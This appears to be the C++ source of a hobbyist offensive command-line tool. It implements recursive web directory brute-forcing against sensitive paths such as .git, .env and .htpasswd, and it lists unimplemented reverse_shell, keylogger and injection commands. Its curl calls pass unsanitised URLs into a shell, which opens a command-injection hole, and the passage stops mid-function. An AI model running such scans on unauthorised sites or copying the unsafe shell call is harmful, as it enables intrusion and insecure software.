/**
 * @file main.cpp
 * @brief Tactical Command-Line Interface (TCLI)
 *
 * This file implements a highly interactive, multi-threaded command-line interface
 * for local and remote directory enumeration, scanning, session management, and more.
 * Features include:
 *   - Local and global (HTTP) directory listing and enumeration
 *   - Parallelized directory and port scanning
 *   - Command history with navigation and syntax highlighting
 *   - Session management (list, kill, resume)
 *   - Simulated security testing (scan, inject, spoof, auth_bypass)
 *   - Configurable user and paths, persistent config file
 *   - Rich ANSI color output and banners
 *   - Highly modular and extensible command structure
 *
 * @author
 *   Initalize
 * @date
 *   2025-06-17
 */

import common;

#include "color.hpp"
#include "platform.hpp"

/**
 * @namespace CLI
 * @brief Encapsulates all CLI-related logic and state.
 */
namespace CLI {
	namespace fs = std::filesystem;

	// -------------------------------------------------------------------------
	// Global State Variables (Now All Configurable)
	// -------------------------------------------------------------------------

	/// Configurable options map (key -> value)
	static std::map<std::string, std::string> config = {
		{"user", "local"},
		{"lc_path", "n/a"},
		{"gl_path", "n/a"},
		{"prompt_color", "green"},
		{"banner_color", "green"},
		{"history_file", ".tcli_history"},
		{"max_enum_depth", "3"},
		{"max_list_depth", "5"},
		{"scan_timeout", "1"},
		{"user_agent", "Mozilla/5.0"},
		{"curl_max_time", "2"},
		{"payload_dir", "./payloads"},
		{"default_session_type", "local"},
		{"default_session_info", ""},
		{"banner_show", "true"},
		{"prompt_show", "true"}
	};

	/// Flag to signal CLI shutdown
	static std::atomic<bool> shouldClose{false};

	// -------------------------------------------------------------------------
	// Session Management Structures
	// -------------------------------------------------------------------------

	struct Session {
		int id;
		std::string type;
		std::string info;
		bool active;
	};
	static std::vector<Session> sessions;
	static int nextSessionId = 1;

	// -------------------------------------------------------------------------
	// Command History
	// -------------------------------------------------------------------------

	static std::vector<std::string> globalHistory;

	// -------------------------------------------------------------------------
	// Utility Functions
	// -------------------------------------------------------------------------

	inline bool startsWith(const std::string& str, const std::string& prefix) {
		return str.size() >= prefix.size() && std::equal(prefix.begin(), prefix.end(), str.begin());
	}
	inline bool endsWith(const std::string& str, const std::string& suffix) {
		return str.size() >= suffix.size() && std::equal(suffix.rbegin(), suffix.rend(), str.rbegin());
	}
	inline void clearScreen() {
	#ifdef _WIN32
		std::system("cls");
	#else
		std::system("clear");
	#endif
	}

	// -------------------------------------------------------------------------
	// Loading Bar (Ultra Fast, No Sleep)
	// -------------------------------------------------------------------------

	void loadingBar(const std::string& msg, int width = 30, int = 1, int = 5) {
		std::cout << COLOR_CYAN << msg << " [";
		for (int i = 0; i < width; ++i) std::cout << "=";
		std::cout << "] Done!" << COLOR_RESET << "\n";
	}

	// -------------------------------------------------------------------------
	// Configuration File Management
	// -------------------------------------------------------------------------

	void loadConfig(const std::string& filename) {
		std::ifstream file(filename);
		if (!file) {
			std::cerr << COLOR_GRAY << "Config file '" << filename << "' not found. Using defaults.\n" << COLOR_RESET;

			std::cout << COLOR_YELLOW << "[ INFO ]" << COLOR_GRAY << " CONFIG - " << COLOR_RESET << "To create a config, run: `tcli setup`\n" << COLOR_RESET;
			return;
		}
		std::string line;
		while (std::getline(file, line)) {
			size_t pos = line.find('=');
			if (pos == std::string::npos) continue;
			std::string key = line.substr(0, pos);
			std::string value = line.substr(pos + 1);
			config[key] = value;
		}
	}

	void saveConfig(const std::string& filename) {
		std::ofstream file(filename);
		if (!file) {
			std::cerr << COLOR_RED << "[ FAIL ]" << COLOR_RESET << " Could not write config file.\n";
			return;
		}
		for (const auto& kv : config) {
			file << kv.first << "=" << kv.second << "\n";
		}
	}

	// -------------------------------------------------------------------------
	// CLI Banner
	// -------------------------------------------------------------------------

	void helloBanner() {
		if (config["banner_show"] == "false") return;
		std::string banner_color = COLOR_GREEN;
		if (config["banner_color"] == "cyan") banner_color = COLOR_CYAN;
		else if (config["banner_color"] == "yellow") banner_color = COLOR_YELLOW;
		else if (config["banner_color"] == "red") banner_color = COLOR_RED;
		else if (config["banner_color"] == "blue") banner_color = COLOR_BLUE;
		else if (config["banner_color"] == "default") banner_color = COLOR_GREEN;
		else if (config["banner_color"] == "purple") banner_color = COLOR_PURPLE;
		else if (config["banner_color"] == "orange") banner_color = COLOR_ORANGE;
		else if (config["banner_color"] == "pink") banner_color = COLOR_PINK;
		else if (config["banner_color"] == "gray") banner_color = COLOR_GRAY;
		else if (config["banner_color"] == "black") banner_color = COLOR_BG_BLK;
		else if (config["banner_color"] == "white") banner_color = COLOR_BG_WHT;
		std::cout << banner_color << COLOR_BOLD << R"(

	 /\_/\  
	( o.o )    
████████╗ ██████╗██╗     ██╗
╚══██╔══╝██╔════╝██║     ██║
   ██║   ██║     ██║     ██║
   ██║   ██║     ██║     ██║
   ██║   ╚██████╗███████╗██║
   ╚═╝    ╚═════╝╚══════╝╚═╝

	   Tactical Command-Line Interface v2.0
		   Made by Initalize
)" << COLOR_RESET;
	}

	// -------------------------------------------------------------------------
	// CLI Prompt (Modified as requested)
	// -------------------------------------------------------------------------

	inline void printPrompt() {
		if (config["prompt_show"] == "false") return;
		std::string prompt_color = COLOR_BG_GRN;
		if (config["prompt_color"] == "cyan") prompt_color = COLOR_BG_CYAN;
		else if (config["prompt_color"] == "yellow") prompt_color = COLOR_BG_YEL;
		else if (config["prompt_color"] == "red") prompt_color = COLOR_BG_RED;
		else if (config["prompt_color"] == "blue") prompt_color = COLOR_BG_BLU;

		// New multi-line status prefix
		std::cout << "\n" << COLOR_BOLD << COLOR_YELLOW << "[ STATUS ]" << COLOR_RESET << "\n";
		std::cout << "  " << prompt_color << COLOR_BOLD << COLOR_GRAY << "LOCAL" << COLOR_RESET << " "
				  << ".LC_PATH: " << COLOR_BOLD << COLOR_YELLOW << config["lc_path"] << COLOR_RESET << "\n";
		std::cout << "  " << COLOR_BG_CYAN << COLOR_BOLD << COLOR_GRAY << "GLOBAL" << COLOR_RESET << " "
				  << ".GL_PATH: " << COLOR_BOLD << COLOR_CYAN << config["gl_path"] << COLOR_RESET << "\n";
		std::cout << "  " << COLOR_BG_MAG << COLOR_BOLD << COLOR_GRAY << "USER" << COLOR_RESET << " "
				  << ".LC_USR: " << COLOR_BOLD << COLOR_PURPLE << config["user"] << COLOR_RESET << "\n";
		std::cout.flush();
	}

	// -------------------------------------------------------------------------
	// Tab Completion Logic
	// -------------------------------------------------------------------------

	// Command and subcommand completion data
	const std::vector<std::string> mainCommands = {
		"help", "quit", "exit", "clr", "clear", "rl", "reload", "tcli", "connect", "ld", "enum", "break",
		"scan", "inject", "auth_bypass", "spoof", "session", "history", "payload_gen", "config", "set"
	};
	const std::map<std::string, std::vector<std::string>> subCommands = {
		{"tcli", {"setup"}},
		{"connect", {"local", "global"}},
		{"ld", {"local", "global"}},
		{"break", {"local", "global"}},
		{"session", {"list", "kill", "resume"}},
		{"history", {"clear"}},
		{"payload_gen", {"reverse_shell", "keylogger"}},
		{"config", {"show", "set"}},
		{"spoof", {"mac", "ip", "dns", "user-agent"}},
		{"inject", {"--sql", "--xss", "--cmd"}},
		{"set", {}}, // handled dynamically
	};
	const std::map<std::string, std::vector<std::string>> connectSubSub = {
		{"global", {"http", "https"}}
	};

	// Helper to split input into tokens
	std::vector<std::string> splitInput(const std::string& input) {
		std::vector<std::string> tokens;
		std::istringstream iss(input);
		std::string token;
		while (iss >> token) tokens.push_back(token);
		return tokens;
	}

	// Print possible completions in a nice format
	void printCompletions(const std::vector<std::string>& completions) {
		if (completions.empty()) return;
		std::cout << "\n";
		for (size_t i = 0; i < completions.size(); ++i) {
			std::cout << "  " << COLOR_BOLD << COLOR_PURPLE << completions[i] << COLOR_RESET;
			if ((i + 1) % 6 == 0) std::cout << "\n";
		}
		std::cout << "\n";
		printPrompt();
		std::cout.flush();
	}

	// Find completions for the current buffer
	std::vector<std::string> getCompletions(const std::string& buffer) {
		auto tokens = splitInput(buffer);
		if (tokens.empty()) {
			return mainCommands;
		}
		if (tokens.size() == 1) {
			std::vector<std::string> matches;
			for (const auto& cmd : mainCommands) {
				if (cmd.find(tokens[0]) == 0)
					matches.push_back(cmd);
			}
			return matches;
		}
		// Subcommand logic
		const std::string& cmd = tokens[0];
		if (subCommands.count(cmd)) {
			const auto& subs = subCommands.at(cmd);
			if (tokens.size() == 2) {
				std::vector<std::string> matches;
				for (const auto& sub : subs) {
					if (sub.find(tokens[1]) == 0)
						matches.push_back(sub);
				}
				// Special: connect global <tab>
				if (cmd == "connect" && tokens[1] == "global" && tokens.size() == 2) {
					return {"http", "https"};
				}
				return matches;
			}
			// connect global <tab>
			if (cmd == "connect" && tokens.size() == 3 && tokens[1] == "global") {
				std::vector<std::string> matches;
				for (const auto& proto : connectSubSub.at("global")) {
					if (proto.find(tokens[2]) == 0)
						matches.push_back(proto);
				}
				return matches;
			}
		}
		// For inject, suggest modes if 3rd token
		if (cmd == "inject" && tokens.size() == 3) {
			std::vector<std::string> modes = {"--sql", "--xss", "--cmd"};
			std::vector<std::string> matches;
			for (const auto& m : modes) {
				if (m.find(tokens[2]) == 0)
					matches.push_back(m);
			}
			return matches;
		}
		// For spoof, suggest types
		if (cmd == "spoof" && tokens.size() == 2) {
			std::vector<std::string> types = {"mac", "ip", "dns", "user-agent"};
			std::vector<std::string> matches;
			for (const auto& t : types) {
				if (t.find(tokens[1]) == 0)
					matches.push_back(t);
			}
			return matches;
		}
		// For payload_gen
		if (cmd == "payload_gen" && tokens.size() == 2) {
			std::vector<std::string> types = {"reverse_shell", "keylogger"};
			std::vector<std::string> matches;
			for (const auto& t : types) {
				if (t.find(tokens[1]) == 0)
					matches.push_back(t);
			}
			return matches;
		}
		// For config
		if (cmd == "config" && tokens.size() == 2) {
			std::vector<std::string> types = {"show", "set"};
			std::vector<std::string> matches;
			for (const auto& t : types) {
				if (t.find(tokens[1]) == 0)
					matches.push_back(t);
			}
			return matches;
		}
		// For session
		if (cmd == "session" && tokens.size() == 2) {
			std::vector<std::string> types = {"list", "kill", "resume"};
			std::vector<std::string> matches;
			for (const auto& t : types) {
				if (t.find(tokens[1]) == 0)
					matches.push_back(t);
			}
			return matches;
		}
		// For break
		if (cmd == "break" && tokens.size() == 2) {
			std::vector<std::string> types = {"local", "global"};
			std::vector<std::string> matches;
			for (const auto& t : types) {
				if (t.find(tokens[1]) == 0)
					matches.push_back(t);
			}
			return matches;
		}
		// For ld
		if (cmd == "ld" && tokens.size() == 2) {
			std::vector<std::string> types = {"local", "global"};
			std::vector<std::string> matches;
			for (const auto& t : types) {
				if (t.find(tokens[1]) == 0)
					matches.push_back(t);
			}
			return matches;
		}
		// For history
		if (cmd == "history" && tokens.size() == 2) {
			std::vector<std::string> types = {"clear"};
			std::vector<std::string> matches;
			for (const auto& t : types) {
				if (t.find(tokens[1]) == 0)
					matches.push_back(t);
			}
			return matches;
		}
		return {};
	}

	// -------------------------------------------------------------------------
	// Command Implementations
	// -------------------------------------------------------------------------

	inline void cmdQuit(const std::string&) { shouldClose = true; }
	inline void cmdClear(const std::string&) { clearScreen(); }

	void cmdReload(const std::string&) {
		clearScreen();
		helloBanner();
		loadingBar("Reloading TCLI config");
		loadConfig("TCLI");
		std::cout << COLOR_GREEN << "[ OK ]" << COLOR_RESET << " Reload complete.\n";
	}

	void cmdSetup(const std::string&) {
		std::cout << COLOR_YELLOW << "Do you want to create a new TCLI config file? (y/n): " << COLOR_RESET;
		std::string answer;
		std::getline(std::cin, answer);
		std::transform(answer.begin(), answer.end(), answer.begin(), ::tolower);
		if (answer == "y" || answer == "yes") {
			saveConfig("TCLI");
			std::cout << COLOR_GREEN << "[ OK ]" << COLOR_RESET << " Config file 'TCLI' created.\n";
		} else {
			std::cout << COLOR_GRAY << "Config file not created.\n" << COLOR_RESET;
		}
	}

	void cmdConnect(const std::string& args) {
		if (startsWith(args, "local ")) {
			std::string path = args.substr(6);
			if (fs::exists(path) && fs::is_directory(path)) {
				config["lc_path"] = path;
				std::cout << COLOR_GREEN << "[ OK ]" << COLOR_RESET << " Connected to local path: " << path << "\n";
			} else {
				std::cerr << COLOR_RED << "[ FAIL ]" << COLOR_RESET << " Local path does not exist or is not a directory: " << path << "\n";
			}
		} else if (startsWith(args, "global ")) {
			std::string url = args.substr(7);
			std::smatch m;
			static const std::regex proto_domain(R"(^\s*(https?|HTTPS?)\s+([^\s]+))");
			if (std::regex_match(url, m, proto_domain)) {
				std::string proto = m[1].str();
				std::string domain = m[2].str();
				std::string fullUrl = proto + "://" + domain;
				config["gl_path"] = fullUrl;
				std::cout << COLOR_GREEN << "[ OK ]" << COLOR_RESET << " Connected to global URL: " << fullUrl << "\n";
			} else if (startsWith(url, "http://") || startsWith(url, "https://")) {
				config["gl_path"] = url;
				std::cout << COLOR_GREEN << "[ OK ]" << COLOR_RESET << " Connected to global URL: " << url << "\n";
			} else {
				std::cerr << COLOR_RED << "[ FAIL ]" << COLOR_RESET << " Usage: connect global <http(s) example.com> or connect global <http(s)://url>\n";
			}
		} else {
			std::cerr << COLOR_GRAY
					<< "Usage:\n"
					<< "  connect local <valid-local-path>\n"
					<< "  connect global <http(s) example.com>\n"
					<< "  connect global <http(s)://url>\n"
					<< COLOR_RESET;
		}
	}

	void listLocalDirectories() {
		std::string localPath = config["lc_path"];
		if (!fs::exists(localPath) || !fs::is_directory(localPath)) {
			std::cerr << COLOR_RED << "[ FAIL ]" << COLOR_RESET << " Local path does not exist or is not a directory: " << localPath << "\n";
			return;
		}
		std::vector<std::string> dirs, files;
		std::vector<std::future<void>> futures;
		std::mutex mtx;
		for (auto& entry : fs::directory_iterator(localPath)) {
			futures.push_back(std::async(std::launch::async, [&entry, &dirs, &files, &mtx] {
				if (entry.is_directory()) {
					std::lock_guard<std::mutex> lock(mtx);
					dirs.push_back(entry.path().filename().string());
				} else {
					std::lock_guard<std::mutex> lock(mtx);
					files.push_back(entry.path().filename().string());
				}
			}));
		}
		for (auto& f : futures) f.wait();
		std::cout << COLOR_GREEN << "Directories in local path (" << localPath << "):" << COLOR_RESET << "\n";
		for (const auto& d : dirs)
			std::cout << "  - " << COLOR_BLUE << d << COLOR_RESET << "\n";
		for (const auto& f : files)
			std::cout << "  - " << COLOR_GRAY << f << COLOR_RESET << "\n";
	}

	std::string combineUrl(const std::string& base, const std::string& relative) {
		if (relative.empty()) return base;
		if (startsWith(relative, "http://") || startsWith(relative, "https://")) return relative;
		std::string b = base;
		if (!b.empty() && b.back() == '/') b.pop_back();
		if (!relative.empty() && relative[0] == '/') {
			std::regex domain_regex(R"(^https?://[^/]+)");
			std::smatch match;
			if (std::regex_search(b, match, domain_regex)) return match.str(0) + relative;
			return b + relative;
		}
		return b + "/" + relative;
	}

	std::vector<std::string> extractLinks(const std::string& html) {
		std::vector<std::string> links;
		static const std::regex href_regex(R"###(<a\s+(?:[^>]*?\s+)?href="([^"]*)")###", std::regex::icase);
		auto begin = std::sregex_iterator(html.begin(), html.end(), href_regex);
		auto end = std::sregex_iterator();
		links.reserve(std::distance(begin, end));
		for (auto i = begin; i != end; ++i)
			links.push_back((*i)[1].str());
		return links;
	}

	std::string httpGet(const std::string& url, const std::string& cookies = "", const std::string& userAgent = "") {
		std::string ua = userAgent.empty() ? config["user_agent"] : userAgent;
		std::string cmd = "curl -s --max-time " + config["curl_max_time"] + " -A \"" + ua + "\"";
		if (!cookies.empty()) cmd += " -b \"" + cookies + "\"";
		cmd += " \"" + url + "\"";
		std::string result;
		FILE* pipe = popen(cmd.c_str(), "r");
		if (!pipe) return "";
		char buffer[4096];
		while (fgets(buffer, sizeof(buffer), pipe) != nullptr)
			result += buffer;
		pclose(pipe);
		return result;
	}

	void enumerateDirectories(const std::string& baseUrl, int depth = 0, int maxDepth = -1, std::set<std::string>* visited = nullptr) {
		if (maxDepth == -1) maxDepth = std::stoi(config["max_enum_depth"]);
		static const std::vector<std::string> commonDirs = {
			"admin/", "private/", "secret/", "hidden/", "config/", "backup/", "data/", "uploads/", "files/", "tmp/", "test/", "dev/", "logs/", "bin/", "cgi-bin/",
			".git/", ".svn/", ".env/", ".htaccess", ".htpasswd", "db/", "db_backup/", "old/", "new/", "staging/", "beta/", "alpha/", "api/", "assets/", "images/", "css/", "js/"
		};
		static std::shared_mutex visMutex;
		static std::set<std::string> staticVisited;
		if (!visited) visited = &staticVisited;
		{
			std::unique_lock lock(visMutex);
			if (depth > maxDepth || visited->count(baseUrl)) return;
			visited->insert(baseUrl);
		}
		std::string indent(depth * 2, ' ');
		std::cout << indent << COLOR_GREEN << "Enumerating: " << baseUrl << COLOR_RESET << "\n";
		std::string html = httpGet(baseUrl);
		if (html.empty()) {
			std::cout << indent << COLOR_YELLOW << "(No response or empty)" << COLOR_RESET << "\n";
			return;
		}

		static std::map<std::string, std::string> notFoundCache;
		std::string notFoundSig;
		{
			std::unique_lock lock(visMutex);
			if (notFoundCache.count(baseUrl)) {
				notFoundSig = notFoundCache[baseUrl];
			} else {
				std::string fake404 = httpGet(combineUrl(baseUrl, "__tcli_fake404__" + std::to_string(rand()) + "/"));
				notFoundSig = fake404.substr(0, 512);
				notFoundCache[baseUrl] = notFoundSig;
			}
		}

		std::vector<std::string> links = extractLinks(html);
		std::set<std::string> foundDirs;
		for (const auto& link : links)
			if (link != "../" && link != "./" && !link.empty() && link.back() == '/')
				foundDirs.insert(link);

		std::vector<std::future<void>> futures;
		std::mutex foundMutex;
		for (const auto& dir : commonDirs) {
			if (foundDirs.count(dir)) continue;
			futures.push_back(std::async(std::launch::async, [&, dir, indent, notFoundSig] {
				std::string tryUrl = combineUrl(baseUrl, dir);
				std::string probe = httpGet(tryUrl);
				if (probe.empty()) return;

				bool not404 = probe.substr(0, 512) != notFoundSig;
				bool statusOk = false;
				{
					std::string cmd = "curl -s -o /dev/null -w \"%{http_code}\" \"" + tryUrl + "\"";
					FILE* pipe = popen(cmd.c_str(), "r");
					if (pipe) {
						char buf[16] = {0};
						fgets(buf, sizeof(buf), pipe);
						std::string code(buf);
						pclose(pipe);
						statusOk = (code.find("200") != std::string::npos || code.find("301") != std::string::npos || code.find("302") != std::string::npos);
					}
				}
				bool looksLikeDir = false;
				static const std::vector<std::string> dirPatterns = {
					"Index of", "Parent Directory", "<title>Index of", "Directory listing for", "To Parent Directory"
				};
				for (const auto& pat : dirPatterns) {
					if (probe.find(pat) != std::string::npos) {
						looksLikeDir = true;
						break;
					}
				}
				std::smatch m;
				std::string title;
				if (std::regex_search(probe, m, std::regex("<title>(.*?)</title>", std::regex::icase)))
					title = m[1].str();
				bool titleOk = !title.empty() && title.find("404") == std::string::npos && title.find("Not Found") == std::string::npos;
				bool notRedirect = true;
				if (probe.find("http-equiv=\"refresh\"") != std::string::npos && probe.find(baseUrl) != std::string::npos)
					notRedirect = false;
				int score = 0;
				if (not404) score++;
				if (statusOk) score++;
				if (looksLikeDir) score++;
				if (titleOk) score++;
				if (notRedirect) score++;
				if (score >= 2) {
					std::lock_guard<std::mutex> lock(foundMutex);
					foundDirs.insert(dir);
					std::cout << indent << COLOR_GREEN << "[ OK ]" << COLOR_RESET << " " << dir
						<< "  " << COLOR_GRAY << "("
						<< (not404 ? "not404 " : "")
						<< (statusOk ? "statusOK " : "")
						<< (looksLikeDir ? "dirPattern " : "")
						<< (titleOk ? "titleOK " : "")
						<< (notRedirect ? "notRedirect" : "")
						<< ")" << COLOR_RESET << "\n";
				}
			}));
		}
		for (auto& f : futures) f.wait();

		std::vector<std::future<void>> recFutures;
		for (const auto& dir : foundDirs) {
			std::string fullUrl = combineUrl(baseUrl, dir);
			std::cout << indent << COLOR_PURPLE << "[" << dir << "]" << COLOR_RESET << "\n";
			recFutures.push_back(std::async(std::launch::async, [&, fullUrl, depth, maxDepth, visited] {
				enumerateDirectories(fullUrl, depth + 1, maxDepth, visited);
			}));
		}
		for (auto& f : recFutures) f.wait();
	}

	void listGlobalRecursive(const std::string& url, int depth = 0, int maxDepth = -1) {
		if (maxDepth == -1) maxDepth = std::stoi(config["max_list_depth"]);
		if (depth > maxDepth) return;
		std::string indent(depth * 2, ' ');
		std::cout << indent << COLOR_GREEN << "Listing: " << url << COLOR_RESET << "\n";
		std::string html = httpGet(url);
		if (html.empty()) {
			std::cout << indent << COLOR_YELLOW << "(Failed to fetch or empty content)" << COLOR_RESET << "\n";
			return;
		}
		std::vector<std::string> links = extractLinks(html);
		if (links.empty()) {
			std::cout << indent << COLOR_YELLOW << "(No links found)" << COLOR_RESET << "\n";
			return;
		}
		std::vector<std::string> directories, files;
		for (const auto& link : links) {
			if (link == "../" || link == "./" || link.empty()) continue;
			if (!link.empty() && link.back() == '/') directories.push_back(link);
			else files.push_back(link);
		}
		if (files.empty() && directories.empty()) {
			std::cout << indent << COLOR_YELLOW << "(No files or directories found)" << COLOR_RESET << "\n";
			return;
		}
		for (const auto& file : files) {
			std::string ext = file.substr(file.find_last_of('.') + 1);
			std::string color = COLOR_GRAY;
			if (ext == "cpp" || ext == "h" || ext == "hpp" || ext == "c") color = COLOR_BLUE;
			else if (ext == "sh" || ext == "py" || ext == "pl" || ext == "rb") color = COLOR_GREEN;
			else if (ext == "txt" || ext == "md") color = COLOR_YELLOW;
			else if (ext == "zip" || ext == "tar" || ext == "gz" || ext == "rar") color = COLOR_RED;
			else if (ext == "json" || ext == "xml") color = COLOR_CYAN;
			else if (ext == "jpg" || ext == "png" || ext == "gif") color = COLOR_PINK;
			std::cout << indent << "  " << color << file << COLOR_RESET << "\n";
		}
		std::vector<std::future<void>> futures;
		for (const auto& dir : directories) {
			std::string fullUrl = combineUrl(url, dir);
			std::cout << indent << COLOR_PURPLE << "[" << dir << "]" << COLOR_RESET << "\n";
			futures.push_back(std::async(std::launch::async, [&, fullUrl, depth, maxDepth] {
				listGlobalRecursive(fullUrl, depth + 1, maxDepth);
			}));
		}
		for (auto& f : futures) f.wait();
	}

	inline void cmdListLocal(const std::string&) { listLocalDirectories(); }
	void cmdListGlobal(const std::string&) {
		if (config["gl_path"] == "n/a") {
			std::cerr << COLOR_RED << "[ FAIL ]" << COLOR_RESET << " No global URL connected. Use 'connect global <url>' first.\n";
			return;
		}
		listGlobalRecursive(config["gl_path"]);
	}

	void cmdHelp(const std::string&) {
		std::cout << COLOR_BOLD << COLOR_CYAN << "TCLI Help\n" << COLOR_RESET;
		std::cout << COLOR_BOLD << "Available commands:\n" << COLOR_RESET;
		std::cout << COLOR_PURPLE << "  help" << COLOR_RESET << "         Show this help message\n";
		std::cout << COLOR_PURPLE << "  quit, exit" << COLOR_RESET << "   Exit the CLI\n";
		std::cout << COLOR_PURPLE << "  clr, clear" << COLOR_RESET << "   Clear the screen\n";
		std::cout << COLOR_PURPLE << "  rl, reload" << COLOR_RESET << "   Reload config and banner\n";
		std::cout << COLOR_PURPLE << "  tcli setup" << COLOR_RESET << "   Create a new config file\n";
		std::cout << COLOR_PURPLE << "  connect local <path>" << COLOR_RESET << "   Connect to a local directory\n";
		std::cout << COLOR_PURPLE << "  connect global <url>" << COLOR_RESET << "   Connect to a global URL\n";
		std::cout << COLOR_PURPLE << "  ld local" << COLOR_RESET << "     List local directories/files\n";
		std::cout << COLOR_PURPLE << "  ld global" << COLOR_RESET << "    List global directories/files recursively\n";
		std::cout << COLOR_PURPLE << "  enum" << COLOR_RESET << "         Enumerate directories on global URL\n";
		std::cout << COLOR_PURPLE << "  break local|global" << COLOR_RESET << "   Break link and clear history for local/global\n";
		std::cout << COLOR_PURPLE << "  scan [target]" << COLOR_RESET << "   Scan local/remote for open ports/services\n";
		std::cout << COLOR_PURPLE << "  inject [target] [payload] [--sql|--xss|--cmd]" << COLOR_RESET << "   Simulate injection attacks\n";
		std::cout << COLOR_PURPLE << "  auth_bypass [target]" << COLOR_RESET << "   Test for insecure authentication\n";
		std::cout << COLOR_PURPLE << "  spoof [type] [options]" << COLOR_RESET << "   Spoof mac/ip/dns/user-agent\n";
		std::cout << COLOR_PURPLE << "  session list" << COLOR_RESET << "   List active sessions\n";
		std::cout << COLOR_PURPLE << "  session kill <id>" << COLOR_RESET << "   Terminate session by ID\n";
		std::cout << COLOR_PURPLE << "  session resume <id>" << COLOR_RESET << "   Resume a saved session\n";
		std::cout << COLOR_PURPLE << "  history" << COLOR_RESET << "   Show command history\n";
		std::cout << COLOR_PURPLE << "  history clear" << COLOR_RESET << "   Clear entire history\n";
		std::cout << COLOR_PURPLE << "  payload_gen <type>" << COLOR_RESET << "   Generate a custom payload (reverse_shell, keylogger)\n";
		std::cout << COLOR_PURPLE << "  config show" << COLOR_RESET << "   Display current configuration\n";
		std::cout << COLOR_PURPLE << "  config set <key> <value>" << COLOR_RESET << "   Change a config option\n";
		std::cout << COLOR_PURPLE << "  set <key> <value> <true|false>" << COLOR_RESET << "   Set config in realtime (true=persist)\n";
		std::cout << COLOR_BOLD << "Syntax Highlighting:\n" << COLOR_RESET;
		std::cout << "  " << COLOR_BOLD << "Commands" << COLOR_RESET << ": " << COLOR_PURPLE << "purple bold" << COLOR_RESET << "\n";
		std::cout << "  " << COLOR_BOLD << "Paths" << COLOR_RESET << ": " << COLOR_YELLOW << "yellow bold" << COLOR_RESET << "\n";
		std::cout << "  " << COLOR_BOLD << "URLs" << COLOR_RESET << ": " << COLOR_CYAN << "cyan underline" << COLOR_RESET << "\n";
		std::cout << "  " << COLOR_BOLD << "Numbers" << COLOR_RESET << ": " << COLOR_GREEN << "green" << COLOR_RESET << "\n";
		std::cout << "  " << COLOR_BOLD << "Strings" << COLOR_RESET << ": " << COLOR_BG_BLU << COLOR_YELLOW << "yellow on blue" << COLOR_RESET << "\n";
		std::cout << "  " << COLOR_BOLD << "Options/flags" << COLOR_RESET << ": " << COLOR_BG_YEL << COLOR_BLUE << "blue on yellow" << COLOR_RESET << "\n";
		std::cout << "  " << COLOR_BOLD << "Local/Global" << COLOR_RESET << ": " << COLOR_BG_GRN << COLOR_GRAY << " LOCAL " << COLOR_RESET << " / " << COLOR_BG_CYAN << COLOR_GRAY << " GLOBAL " << COLOR_RESET << "\n";
		std::cout << COLOR_BOLD << "Tips:\n" << COLOR_RESET;
		std::cout << "  Use " << COLOR_BOLD << "Tab" << COLOR_RESET << " for auto-completion (now available!)\n";
		std::cout << "  Use " << COLOR_BOLD << "Up/Down" << COLOR_RESET << " arrows for history navigation\n";
	}

	void cmdEnum(const std::string&) {
		if (config["gl_path"] == "n/a") {
			std::cerr << COLOR_RED << "[ FAIL ]" << COLOR_RESET << " No global URL connected. Use 'connect global <url>' first.\n";
			return;
		}
		enumerateDirectories(config["gl_path"]);
	}

	void removeHistoryFor(const std::string& type, const std::string& path) {
		auto sanitize = [](const std::string& s) -> std::string {
			std::string out = s;
			std::replace(out.begin(), out.end(), '/', '_');
			std::replace(out.begin(), out.end(), '\\', '_');
			std::replace(out.begin(), out.end(), ':', '_');
			std::replace(out.begin(), out.end(), '?', '_');
			std::replace(out.begin(), out.end(), '*', '_');
			std::replace(out.begin(), out.end(), '<', '_');
			std::replace(out.begin(), out.end(), '>', '_');
			std::replace(out.begin(), out.end(), '|', '_');
			return out;
		};
		std::string histFile = ".tcli_history_" + type + "_" + sanitize(path);
		if (fs::exists(histFile)) {
			std::error_code ec;
			fs::remove(histFile, ec);
			if (!ec)
				std::cout << COLOR_GREEN << "[ OK ]" << COLOR_RESET << " Removed history file: " << histFile << "\n";
			else
				std::cerr << COLOR_RED << "[ FAIL ]" << COLOR_RESET << " Could not remove history file: " << histFile << "\n";
		}
	}

	void cmdBreak(const std::string& args) {
		std::string arg = args;
		std::transform(arg.begin(), arg.end(), arg.begin(), ::tolower);
		if (arg == "local") {
			if (config["lc_path"] == "n/a") {
				std::cerr << COLOR_RED << "[ FAIL ]" << COLOR_RESET << " No local directory is currently connected.\n";
				return;
			}
			removeHistoryFor("local", config["lc_path"]);
			config["lc_path"] = "n/a";
			std::cout << COLOR_GREEN << "[ OK ]" << COLOR_RESET << " Local directory link broken and history removed.\n";
		} else if (arg == "global") {
			if (config["gl_path"] == "n/a") {
				std::cerr << COLOR_RED << "[ FAIL ]" << COLOR_RESET << " No global URL is currently connected.\n";
				return;
			}
			removeHistoryFor("global", config["gl_path"]);
			config["gl_path"] = "n/a";
			std::cout << COLOR_GREEN << "[ OK ]" << COLOR_RESET << " Global URL link broken and history removed.\n";
		} else {
			std::cerr << COLOR_GRAY << "Usage: break local|global" << COLOR_RESET << "\n";
		}
	}

	std::string highlightInput(const std::string& buffer) {
		static const std::set<std::string> commands = {
			"quit", "exit", "clr", "clear", "rl", "reload", "connect", "ld", "help", "enum", "break",
			"scan", "inject", "auth_bypass", "spoof", "session", "history", "payload_gen", "config", "set", "tcli"
		};
		static const std::set<std::string> options = {
			"-h", "--help", "-v", "--version", "-a", "--all", "-r", "--recursive",
			"--sql", "--xss", "--cmd", "--randomize", "setup"
		};
		static const std::set<std::string> keywords = {
			"local", "global", "user", "admin", "path", "url", "mac", "ip", "dns", "user-agent", "list", "kill", "resume", "show", "set", "clear", "reverse_shell", "keylogger"
		};
		static const std::set<std::string> bool_literals = {
			"true", "false"
		};
		std::string result;
		static const std::regex url_regex(R"(https?://[^\s]+)");
		static const std::regex path_regex(R"((/[^ ]+)+)");
		static const std::regex number_regex(R"(\b\d+\b)");
		static const std::regex string_regex(R"(["'][^"']*["'])");
		static const std::regex flag_regex(R"((--?[a-zA-Z0-9_-]+))");
		static const std::regex word_regex(R"(\b[a-zA-Z_][a-zA-Z0-9_]*\b)");
		static const std::regex hex_regex(R"(\b0x[0-9a-fA-F]+\b)");
		static const std::regex ip_regex(R"(\b\d{1,3}(\.\d{1,3}){3}\b)");
		static const std::regex email_regex(R"([a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+)");
		static const std::regex assign_regex(R"((=))");
		size_t pos = 0;
		while (pos < buffer.size()) {
			std::smatch m;
